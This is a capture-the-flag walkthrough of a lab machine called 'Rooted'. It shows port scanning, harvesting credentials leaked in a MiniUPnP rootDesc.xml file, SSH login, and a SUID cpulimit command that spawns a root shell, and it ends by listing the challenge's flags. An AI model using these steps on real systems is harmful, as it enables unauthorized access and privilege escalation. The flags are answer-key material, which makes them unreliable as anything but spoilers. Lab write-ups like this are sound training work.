+++
title = "Rooted - Walkthrough"
date = "2026-08-12"
author = "nvru"
description = "Walkthrough for the Rooted machine."
tags = [
"ctf",
"walkthrough",
"linux",
"upnp",
"information-disclosure",
"ssh",
"suid",
"cpulimit",
"privilege-escalation"
]
draft = false
+++

## Overview

- **Attacker IP:** `10.10.10.2`
- **Target Machine IP:** `10.10.10.6`

The objective was to enumerate the target, identify exposed services, gain initial access using credentials disclosed by the UPnP service, and escalate privileges by abusing a SUID `cpulimit` binary.

![Machine Information](/images/hmv/rooted/vm.png)

---

## Enumeration

### Port Scanning

#### RustScan

```bash
rustscan -a 10.10.10.6 -- -sC -sV -A -oN nmap/rust
```

#### Results

```text
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 10.0p2 Debian 7+deb13u2 (protocol 2.0)
8888/tcp open  upnp    syn-ack MiniUPnP 2.3.9 (UPnP 1.1)
| fingerprint-strings:
|   FourOhFourRequest, GetRequest:
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html
|     Connection: close
|     Content-Length: 134
|     Server: Debian/6.12.74+deb13+1-amd64 UPnP/1.1 MiniUPnPd/2.3.9
|   GenericLines:
|     501 Not Implemented
|     Content-Type: text/html
|     Connection: close
|     Content-Length: 149
|     Server: Debian/6.12.74+deb13+1-amd64 UPnP/1.1 MiniUPnPd/2.3.9
|   HTTPOptions:
|     HTTP/1.0 501 Not Implemented
|     Content-Type: text/html
|     Connection: close
|     Content-Length: 149
|     Server: Debian/6.12.74+deb13+1-amd64 UPnP/1.1 MiniUPnPd/2.3.9
|   RTSPRequest:
|     RTSP/1.0 501 Not Implemented
|     Content-Type: text/html
|     Connection: close
|     Content-Length: 149
|     Server: Debian/6.12.74+deb13+1-amd64 UPnP/1.1 MiniUPnPd/2.3.9
```

The scan revealed two exposed services:

- SSH on port `22`
- UPnP on port `8888`

Since the UPnP service was less common, I started by enumerating it.

---

### UPnP Enumeration

After some research, I found that the MiniUPnP service exposes a `rootDesc.xml` file.

Reference:

- https://www.rapid7.com/blog/post/2020/12/22/upnp-with-a-holiday-cheer/

I retrieved the XML file with:

```bash
curl -s http://10.10.10.6:8888/rootDesc.xml
```

The response contained what appeared to be valid credentials:

```text
upnp:nat123!
```

![UPnP Credentials](/images/hmv/rooted/upnp_creds.png)

Since SSH was exposed on port `22`, I tested these credentials against the SSH service.

---

## Initial Access

The credentials were valid for the `upnp` user.

```text
Username: upnp
Password: nat123!
```

I connected to the machine using SSH:

```bash
ssh upnp@10.10.10.6
```

![SSH Login](/images/hmv/rooted/ssh_upnp.png)

After obtaining a shell, I first checked the user's sudo permissions.

```bash
sudo -l
```

The `upnp` user did not have any useful sudo permissions.

![No Sudo Permissions](/images/hmv/rooted/no_sudo.png)

Since sudo was not an option, I continued looking for other privilege-escalation opportunities.

---

## Privilege Escalation

### SUID Enumeration

I searched the filesystem for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

A `cpulimit` binary with the SUID bit set was found.

![SUID Files](/images/hmv/rooted/find_suid.png)

A SUID binary runs with the privileges of its owner. Since `cpulimit` was running with elevated privileges, I investigated whether it could be abused to execute another program with those privileges.

---

### cpulimit

I checked the available options:

```bash
cpulimit --help
```

![cpulimit Help](/images/hmv/rooted/cpulimit_help.png)

The `-f` option allows the specified program to run in the foreground, while `-l` specifies the CPU usage limit.

A CPU limit needs to be supplied. Without one, attempting to launch a shell can cause the process to exit immediately.

GTFOBins documents a similar technique:

- https://gtfobins.org/gtfobins/cpulimit/

I used:

```bash
cpulimit -l 100 -f -- /bin/sh -p
```

The command spawned a privileged shell.

![Root Shell](/images/hmv/rooted/root.png)

I verified the privileges:

```bash
id
```

The shell was running as `root`, completing the privilege escalation.

---

## Credentials

```text
upnp:nat123!
```

---

## Flags

```text
user:70f631df929ad442dee6a7b461e3b628ad7856c6c56c63b416c4396c93ac6c96

root:37149263831ce0ea0278305dcb04b680e7b0fcff6133cf2ec8af49b235ea41ba
```
